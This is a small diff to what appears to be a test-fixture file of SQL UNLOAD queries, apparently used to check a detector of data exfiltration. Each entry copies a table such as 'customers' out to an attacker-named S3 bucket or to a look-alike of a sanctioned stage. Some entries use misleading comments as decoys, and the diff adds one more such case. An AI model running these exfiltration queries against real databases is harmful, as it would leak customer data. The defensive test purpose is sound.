@@ -2,3 +2,4 @@
 {"query_type": "UNLOAD", "query_text": "COPY INTO 's3://attacker-bucket/x/' FROM customers CREDENTIALS=(AWS_KEY_ID='AKIAEXAMPLE' AWS_SECRET_KEY='example') /* @~ routine */"}
 {"query_type": "UNLOAD", "query_text": "COPY INTO 's3://attacker-bucket/y/' FROM big_table /* MY_SANCTIONED_STAGE */"}
 {"query_type": "UNLOAD", "query_text": "COPY INTO @MY_SANCTIONED_STAGE_EVIL/dump FROM customers"}
+{"query_type": "UNLOAD", "query_text": "COPY INTO @MY_SANCTIONED_STAGE_EVIL FROM customers"}
